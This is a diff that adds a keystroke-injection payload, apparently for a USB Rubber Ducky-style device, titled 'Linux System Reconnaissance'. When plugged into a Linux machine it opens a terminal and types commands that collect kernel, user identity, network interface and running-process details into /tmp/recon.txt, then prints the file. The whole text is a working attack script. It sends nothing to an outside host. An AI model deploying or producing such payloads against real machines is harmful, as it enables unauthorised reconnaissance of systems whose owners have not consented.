@@ -1,0 +1,31 @@
+REM =====================================================
+REM Title: Linux System Reconnaissance
+REM Author: yogeshjoga
+REM Target: Linux (All distributions)
+REM Category: Command Execution
+REM Description: Gathers comprehensive system information
+REM =====================================================
+
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING echo "=== SYSTEM INFO ===" > /tmp/recon.txt
+ENTER
+STRING uname -a >> /tmp/recon.txt
+ENTER
+STRING echo "=== USER INFO ===" >> /tmp/recon.txt
+ENTER
+STRING whoami >> /tmp/recon.txt
+ENTER
+STRING id >> /tmp/recon.txt
+ENTER
+STRING echo "=== NETWORK INFO ===" >> /tmp/recon.txt
+ENTER
+STRING ip a >> /tmp/recon.txt
+ENTER
+STRING echo "=== PROCESSES ===" >> /tmp/recon.txt
+ENTER
+STRING ps aux >> /tmp/recon.txt
+ENTER
+STRING cat /tmp/recon.txt && exit
+ENTER
